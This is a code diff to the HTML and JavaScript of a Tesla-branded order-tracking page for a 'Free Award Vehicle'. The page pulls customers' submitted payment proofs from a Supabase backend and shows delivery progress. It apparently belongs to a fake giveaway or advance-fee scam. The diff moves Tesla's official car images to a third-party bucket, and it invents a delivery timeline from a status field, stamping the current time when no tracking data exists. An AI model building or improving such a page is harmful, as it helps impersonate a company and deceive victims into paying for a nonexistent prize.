@@ -482,7 +482,7 @@
   <!-- Vehicle Hero -->
   <div class="vehicle-hero anim-1" id="vehicleHeroCard">
     <div class="vehicle-img-box">
-      <img id="vehicleImg" src="https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png" alt="Tesla">
+      <img id="vehicleImg" src="https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png" alt="Tesla">
     </div>
     <div class="vehicle-info">
       <div class="vehicle-badge-tag">Free Award Vehicle</div>
@@ -622,13 +622,14 @@
   var params     = new URLSearchParams(window.location.search);
   var urlOrderId = params.get('order') || '';
 
+  var IMG_BASE = 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/';
   var carImgMap = {
-    cybertruck: 'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Cybertruck.png',
-    modely:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-Y.png',
-    models:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-S.png',
-    model3:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-3.png',
-    modelx:     'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/Mega-Menu-Vehicles-Model-X.png',
-    roadster:   'https://digitalassets.tesla.com/tesla-contents/image/upload/f_auto,q_auto/tesla-roadster.png'
+    cybertruck: IMG_BASE + 'cybertruck-main.png',
+    modely:     IMG_BASE + 'modely-main.png',
+    models:     IMG_BASE + 'models-main.png',
+    model3:     IMG_BASE + 'model3-main.png',
+    modelx:     IMG_BASE + 'modelx-main.png',
+    roadster:   IMG_BASE + 'models-main.png'
   };
 
   var stageIcons = [
@@ -644,7 +645,12 @@
   var stageLabels = ['Order Confirmed', 'Processing', 'Shipped', 'In Transit', 'Out for Delivery', 'Delivered'];
 
   function el(id) { return document.getElementById(id); }
-  function setText(id, v) { var e = el(id); if (e) e.textContent = v || '—'; }
+  function setText(id, v) {
+    var e = el(id); if (!e) return;
+    var s = (v == null || v === undefined) ? '' : String(v).trim();
+    if (!s || s === '_' || s === '-' || s === '—') { e.textContent = '—'; return; }
+    e.textContent = s;
+  }
   function fmt(iso) {
     if (!iso) return '—';
     try { return new Date(iso).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }); }
@@ -812,7 +818,7 @@
     // Timeline & map
     renderTimeline(order.timeline || [], order.status || 'confirmed');
     try {
-      initMap(dd.city || '', dd.state || '', dd.country || '');
+      initMap(dd);
     } catch(e) {}
   }
 
@@ -820,7 +826,8 @@
     if (!proof) return;
     var status = proof.status || 'pending';
     setStatus(status);
-    setText('proofDate', proof.created_at ? fmtDT(proof.created_at) : '—');
+    var submittedAt = proof.created_at || proof.createdAt || proof.submitted_at || proof.timestamp || '';
+    setText('proofDate', submittedAt ? fmtDT(submittedAt) : '—');
     var methodLabel = labelOf(proof.payment_method || proof.paymentMethod, '—');
     setText('proofMethod', methodLabel);
     // Also fill order summary payment if still empty / placeholder
@@ -848,14 +855,32 @@
     }
   }
 
-  function renderTimeline  function renderTimeline(timeline, status) {
+  function renderTimeline(timeline, status) {
     var steps = el('tlSteps');
     var fill  = el('progressFill');
     var pctEl = el('progressPct');
     if (!steps) return;
 
-    var tl = (timeline && timeline.length > 0) ? timeline : stageLabels.map(function(s){ return { stage: s, completed: false, timestamp: null }; });
+    var statusKey = String(status || 'confirmed').toLowerCase().replace(/\s+/g, '_');
+    var statusOrder = { confirmed: 1, processing: 2, shipped: 3, in_transit: 4, out_for_delivery: 5, delivered: 6 };
+    var completedCount = statusOrder[statusKey] || 1;
+
+    var tl = (timeline && timeline.length > 0) ? timeline.slice() : stageLabels.map(function(s, i){
+      return {
+        stage: s,
+        completed: i < completedCount,
+        timestamp: (i === 0 ? new Date().toISOString() : null)
+      };
+    });
+    // If timeline exists but nothing marked completed, mark stages from status
     var done = tl.filter(function(t){ return t.completed; }).length;
+    if (done === 0 && tl.length) {
+      for (var i = 0; i < Math.min(completedCount, tl.length); i++) {
+        tl[i].completed = true;
+        if (!tl[i].timestamp && i === 0) tl[i].timestamp = new Date().toISOString();
+      }
+      done = tl.filter(function(t){ return t.completed; }).length;
+    }
     var pct  = tl.length > 0 ? Math.max(5, Math.min(100, Math.round((done / tl.length) * 100))) : 5;
 
     if (fill) fill.style.width = pct + '%';
@@ -928,14 +953,22 @@
 
   // Fetch proof status by customer email (the real link between proofs and orders)
   function fetchProofByEmail(email) {
-    if (!email) return;
+    // Prefer session API (service role) — direct Rest with anon key is blocked/invalid
+    var session = (typeof getSession === 'function') ? getSession() : (localStorage.getItem('tesla_session') || localStorage.getItem('tesla_session_token'));
+    if (session && typeof apiCall === 'function') {
+      apiCall('/session?token=' + encodeURIComponent(session))
+        .then(function(data){
+          if (data && data.valid && data.paymentProof) applyPaymentProof(data.paymentProof);
+        }).catch(function(){});
+      return;
+    }
+    // Last resort: try REST only if a real anon key was injected
+    if (!email || !SUPABASE_ANON_KEY || SUPABASE_ANON_KEY.indexOf('puebwzumwqizgbmksrpq') === -1) return;
     fetch(SUPABASE_URL + '/rest/v1/payment_proofs?select=status,proof_url,created_at,payment_method,delivery_method,amount,order_id&customer_email=eq.' + encodeURIComponent(email) + '&order=created_at.desc&limit=1', {
       headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': 'Bearer ' + SUPABASE_ANON_KEY }
     }).then(function(r){ return r.ok ? r.json() : null; })
     .then(function(rows){
-      if (rows && rows.length > 0) {
-        applyPaymentProof(rows[0]);
-      }
+      if (rows && rows.length > 0) applyPaymentProof(rows[0]);
     }).catch(function(){});
   }
 
